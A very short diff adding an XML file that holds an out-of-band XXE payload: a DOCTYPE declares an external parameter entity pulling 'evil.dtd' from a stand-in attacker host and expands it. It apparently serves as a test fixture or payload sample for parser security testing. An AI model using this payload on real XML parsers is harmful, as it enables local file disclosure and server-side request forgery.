@@ -1,0 +1,4 @@
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
+%xxe;]>
+<foo>123</foo>
